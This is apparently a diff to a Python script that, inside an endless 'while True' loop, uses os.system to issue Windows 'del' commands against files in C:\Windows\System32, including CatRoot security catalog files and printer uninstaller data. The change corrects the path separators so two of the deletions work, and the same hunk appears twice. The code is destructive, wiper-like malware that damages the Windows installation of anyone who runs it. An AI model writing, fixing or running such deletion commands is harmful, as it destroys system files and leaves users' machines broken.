@@ -140,8 +140,8 @@ while True:
                                                 os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/Setup.ini")
                                                 os.system.__call__("del C:\Windows/System32/CatRoot/{127D0A1D-4EF2-11D1-8608-00C04FC295EE}/HPFusion")
                                                 os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1.CAT")
-                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
-                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
 
 
 
@@ -317,5 +317,5 @@ while True:
                                                 os.system.__call__("del C:\Windows/System32/CanonIJ Uninstaller Information/{1199FAD5-9546-44f3-81CF-FFDB8040B7BF}_Canon_MG5200_series/Setup.ini")
                                                 os.system.__call__("del C:\Windows/System32/CatRoot/{127D0A1D-4EF2-11D1-8608-00C04FC295EE}/HPFusion")
                                                 os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1.CAT")
-                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
-                                                os.system.__call__("del C:\Windows/System32\CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1A.CAT")
+                                                os.system.__call__("del C:\Windows/System32/CatRoot/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/1B.CAT")
